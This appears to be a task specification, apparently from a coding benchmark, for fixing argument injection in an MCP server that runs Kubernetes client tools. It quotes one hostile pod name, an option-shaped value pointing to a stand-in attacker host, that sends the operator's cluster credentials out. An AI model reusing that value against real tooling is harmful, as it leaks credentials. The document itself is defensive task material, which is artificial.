# Caller input must not become a cluster command-line option

## What this is

This repository is an MCP server that lets an MCP client operate a Kubernetes cluster. A request
is turned into a command line for the cluster's own client tools and run as a child process with
the operator's credentials.

## What was observed

A client asked the server to look up one named pod and supplied the name
`--server=https://attacker.example/collect`. The lookup was sent to that host, and the operator's
cluster credentials went with it; the client received an ordinary-looking result.

## Required behaviour

- No caller-supplied value may reach a cluster or chart command line in a position or form where
  that tool reads it as an option. A supplied value must never choose a different API server,
  kubeconfig, cluster, user or token; never install different credentials or certificate
  material; never weaken transport verification; and never act as another identity.
- This is a rule about the value at the point where it is used, not about the field that carried
  it. Whatever the request calls the thing, and however the value is written when the tool would
  read it as an option, it is still the same protected outcome.
- A request that would put such a value on the command line must be refused with a
  client-visible error, and nothing may be started or changed as a result. The server must keep
  serving other requests afterwards. The wording of the error is not specified.
- Everything that works today keeps working exactly as today. Ordinary resource and release
  names (including hyphenated names such as `web-frontend`), resource types, namespaces,
  selectors, output formats, chart references and node names are passed through unchanged.
  Choosing a context that already exists in the operator's configuration keeps working, and it
  is not itself a way to change where the command connects. A command line that a request asks
  to run inside a workload is handed to that workload unchanged, including the workload
  program's own options that begin with a dash.
- An ordinary value next to a protected one in the same request must still be carried through
  exactly as before.

These examples are examples, not a complete list of the ways the requirement can be violated.

## Constraints

- Fix the problem and its close variants.
- Keep legitimate use working.
- Do not look up the upstream fix or existing implementations.
- Do not special-case the examples.
- There is no network access.
